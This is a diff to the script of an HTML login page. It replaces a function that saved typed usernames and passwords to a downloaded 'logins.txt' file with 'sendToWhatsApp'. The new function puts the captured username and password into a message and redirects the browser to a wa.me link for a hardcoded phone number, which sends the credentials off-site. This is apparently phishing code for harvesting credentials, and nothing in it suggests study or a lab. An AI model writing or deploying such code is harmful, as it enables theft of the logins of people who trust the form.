@@ -49,24 +49,20 @@
     </div>
 
     <script>
-        function saveToFile() {
+        function sendToWhatsApp() {
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
+            var phoneNumber = "918590690984"; // Replace with your WhatsApp number
 
             if (username === "" || password === "") {
                 alert("Please fill in both fields.");
                 return;
             }
 
-            var text = `Login Attempt\nUsername: ${username}\nPassword: ${password}\n\n`;
-            var blob = new Blob([text], { type: "text/plain" });
-            var a = document.createElement("a");
+            var message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+            var whatsappURL = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
 
-            a.href = URL.createObjectURL(blob);
-            a.download = "logins.txt"; // File name
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            window.location.href = whatsappURL;
         }
     </script>
 
